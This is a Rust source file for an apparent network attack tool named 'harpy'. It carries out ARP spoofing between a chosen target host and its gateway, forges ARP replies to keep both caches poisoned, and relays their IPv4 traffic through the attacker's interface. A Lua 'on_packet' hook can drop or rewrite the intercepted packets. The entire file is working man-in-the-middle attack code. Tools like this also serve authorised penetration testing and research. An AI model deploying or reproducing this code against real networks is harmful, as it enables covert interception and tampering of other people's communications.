use std::{net::{IpAddr, Ipv4Addr}, sync::Arc};
use pnet::{
    datalink::{self, NetworkInterface},
    packet::{
        ethernet::{MutableEthernetPacket, EtherTypes},
        arp::{ArpPacket},
        Packet,
        PacketSize
    }
};
use crate::{util, Commands, sink::{Sink}, arp::ARPController, engine::{HarpyEngine, EngineResult, types::LuaEthernetPacket}};

pub(crate) fn run(args: crate::Args) {
    match args.command {
        Commands::Spoof {
            target,
            gateway,
            interface,
            file,
            all
        } => {
            let interface = datalink::interfaces().into_iter().filter(|iface: &NetworkInterface| iface.name == interface).next().unwrap_or_else(|| panic!("No such interface: {}", interface));
            let primary_ip = match interface.ips[0].ip() { IpAddr::V4(ip) => ip, _ => panic!("IPv4 address expected") };
            let target: Ipv4Addr = target.parse().unwrap_or_else(|_| panic!("Invalid IP address: {}", target));
            let gateway: Ipv4Addr = match gateway
                                .map_or_else(|| util::get_gateway_for(&interface), |s| str::parse(&s).ok())
                                .unwrap_or_else(|| panic!("No gateway could be determined for: {}", interface.name)) {
                                    IpAddr::V4(ip) => ip,
                                    _ => panic!("Expected IPv4 gateway")
                                };


            let sink = Arc::new(match Sink::new(&interface) { Ok(sink) => sink, Err(e) => { error!("Couldn't start network socket: {:#?}", e); std::process::exit(1); } });

            let harpy = HarpyEngine::new();
            harpy.context(|ctx| {
                ctx.globals().set("MTU", sink.mtu())?;
                ctx.globals().set("harpy_mode", "spoof")
            }).unwrap();
            if let Some(ref file) = file {
                harpy.run_file(file.to_owned()).unwrap();
            }

            let rx_channel = sink.add_rx();
            let clone = sink.clone();
            std::thread::spawn(move || {
                let sink = clone.clone();
                sink.run()
            });

            let mut arp = ARPController::new(interface.clone(), sink.clone());

            let gateway_mac = arp.resolve_mac(&gateway).unwrap_or_else(|| panic!("Could not resolve MAC for gateway: {}", gateway));
            let target_mac = arp.resolve_mac(&target).unwrap_or_else(|| panic!("Could not resolve MAC for target: {}", target));
            info!("Gateway MAC: {} -> {}", gateway, gateway_mac);
            info!("Target MAC: {} -> {}", target, target_mac);

            // Spoof both the gateway and the target
            arp.spoof(gateway, interface.mac.unwrap(), target, target_mac);
            arp.spoof(target, interface.mac.unwrap(), gateway, gateway_mac);
            info!("Spoofed ARP entries for {} and {}", gateway, target);

            'network: loop {
                let mut packet = rx_channel.recv().unwrap();

                // Check if the packet is an ARP request for the target
                // If it is, spoof the ARP reply
                if packet.get_ethertype() == EtherTypes::Arp {
                    if let Some(arp_packet) = ArpPacket::new(packet.payload()) {
                        let target_ip = arp_packet.get_target_proto_addr();
                        if arp.spoof_table().contains(&target_ip)
                            && (arp_packet.get_sender_proto_addr() == gateway
                                || arp_packet.get_sender_proto_addr() == target) {
                            //&& arp_packet.get_sender_proto_addr() != primary_ip {
                            debug!("{} is requesting {}, spoofing...", arp_packet.get_sender_proto_addr(), target_ip);
                            let arp_response = ARPController::build_arp_packet(
                                interface.mac.unwrap(),
                                arp_packet.get_sender_hw_addr(),
                                interface.mac.unwrap(),
                                target_ip,
                                arp_packet.get_sender_hw_addr(),
                                arp_packet.get_sender_proto_addr(),
                                pnet::packet::arp::ArpOperations::Reply
                            );
                            sink.send(arp_response);
                            std::thread::sleep(std::time::Duration::from_millis(150));
                            let arp_response = ARPController::build_arp_packet(
                                interface.mac.unwrap(),
                                arp_packet.get_sender_hw_addr(),
                                interface.mac.unwrap(),
                                target_ip,
                                arp_packet.get_sender_hw_addr(),
                                arp_packet.get_sender_proto_addr(),
                                pnet::packet::arp::ArpOperations::Reply
                            );
                            sink.send(arp_response);
                        }
                    }
                }


                if packet.get_ethertype() == EtherTypes::Ipv4 {
                    // Check if IPv4 Destination == gateway and IPv4 source == target, then forward it
                    // Check if IPv4 Destination == target and IPv4 source == gateway, then forward it
                    let payload = packet.payload();
                    let source_ip: Ipv4Addr = Ipv4Addr::from([payload[12],payload[13],payload[14], payload[15]]).try_into().unwrap();
                    let target_ip: Ipv4Addr = Ipv4Addr::from([payload[16],payload[17],payload[18], payload[19]]).try_into().unwrap();
                    trace!("{} -> {}", source_ip, target_ip);
                    //let target_ip: Ipv4Addr = packet.payload()[16..20].try_into().unwrap();

                    //let is_targeted = (packet.get_source() == target_mac && target_ip != primary_ip) || (packet.get_source() == gateway_mac && source_ip == target);
                    let is_targeted = source_ip == target || target_ip == target && target_ip != primary_ip;
                    if file.is_some() && (is_targeted || all){
                        let start = std::time::Instant::now();
                        let status = harpy.context(|ctx| {
                            let packet: LuaEthernetPacket = (&packet).into();
                            let g = ctx.globals();

                            if let Ok(on_packet) = g.get::<_, rlua::Function>("on_packet") {
                                let result = on_packet.call::<LuaEthernetPacket, Option<LuaEthernetPacket>>(packet)
                                    .unwrap_or_else(|e| { error!("on_packet: {}", e); None });
                                if let Some(b) = result {
                                    if b.dropped() {
                                        return EngineResult::Drop;
                                    }else if b.tampered() {
                                        return EngineResult::Tamper(b.into());

                                    }
                                }
                            }
                            EngineResult::Continue
                        });
                        match status {
                            EngineResult::Continue => (),
                            EngineResult::Drop => continue 'network,
                            EngineResult::Tamper(tampered) => {
                                packet = tampered;
                            }
                        }
                        trace!("lua - Packet processed in {}ms", start.elapsed().as_millis());
                    }

                    let ipv4 = pnet::packet::ipv4::Ipv4Packet::new(packet.payload()).unwrap();
                    if packet.get_source() == target_mac && ipv4.get_destination() != primary_ip {
                        trace!("[Target -> Gateway] Rerouting {} bytes of data", ipv4.packet_size());

                        let mut ethernet_buffer: Vec<u8> = Vec::new();
                        ethernet_buffer.extend_from_slice(packet.packet());
                        let mut ethernet_packet = MutableEthernetPacket::owned(ethernet_buffer).unwrap();
                        ethernet_packet.set_source(interface.mac.unwrap());
                        ethernet_packet.set_destination(gateway_mac);
                        ethernet_packet.set_ethertype(EtherTypes::Ipv4);

                        sink.send(ethernet_packet.consume_to_immutable());
                    }else if packet.get_source() == gateway_mac && ipv4.get_destination() == target {
                        trace!("[Gateway -> Target] Rerouting {} bytes of data", ipv4.packet_size());

                        let mut ethernet_buffer: Vec<u8> = Vec::new();
                        ethernet_buffer.extend_from_slice(packet.packet());
                        let mut ethernet_packet = MutableEthernetPacket::owned(ethernet_buffer).unwrap();
                        ethernet_packet.set_source(interface.mac.unwrap());
                        ethernet_packet.set_destination(target_mac);
                        ethernet_packet.set_ethertype(EtherTypes::Ipv4);

                        sink.send(ethernet_packet.consume_to_immutable());
                    }
                }
            }
        },
        _ => {}
    }
}




